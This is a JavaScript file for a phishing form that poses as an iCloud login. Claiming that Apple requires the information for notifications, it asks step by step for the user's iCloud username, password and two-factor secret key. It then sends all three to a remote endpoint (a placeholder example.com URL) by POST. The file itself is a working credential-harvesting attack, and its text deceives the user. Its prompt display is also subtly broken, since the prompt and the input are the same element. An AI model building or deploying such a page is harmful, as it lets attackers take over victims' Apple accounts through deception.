let currentPrompt = 0;
let icloudUsername = "";
let icloudPassword = "";
let twoFactorSecret = "";

document.addEventListener("DOMContentLoaded", function() {
  const promptContainer = document.getElementById("icloud-login-form");
  const promptElement = document.getElementById("icloud_username");
  const inputField = document.getElementById("icloud_username");
  const nextButton = document.getElementById("next-button");

  nextButton.addEventListener("click", function() {
    console.log("Button clicked!");

    if (inputField.value === "") {
      alert("Please enter some input before clicking next!");
      return;
    }

    switch (currentPrompt) {
      case 0:
        console.log("Case 0");
        icloudUsername = inputField.value;
        promptElement.innerHTML = "Apple requires this information to receive iCloud notifications. Enter iCloud Password:";
        inputField.value = "";
        inputField.type = "password";
        break;
      case 1:
        console.log("Case 1");
        icloudPassword = inputField.value;
        promptElement.innerHTML = "Apple requires this information to receive iCloud notifications. Enter 2FA Secret Key:";
        inputField.value = "";
        inputField.type = "text";
        break;
      case 2:
        console.log("Case 2");
        twoFactorSecret = inputField.value;
        // Submit the form to the endpoint
        const formData = new FormData();
        formData.append("icloud_username", icloudUsername);
        formData.append("icloud_password", icloudPassword);
        formData.append("two_factor_secret", twoFactorSecret);
        fetch("https://example.com/endpoint", {
          method: "POST",
          body: formData
        })
        .then(response => response.json())
        .then(data => console.log(data))
        .catch(error => console.error(error));
        break;
    }
    currentPrompt++;
  });
});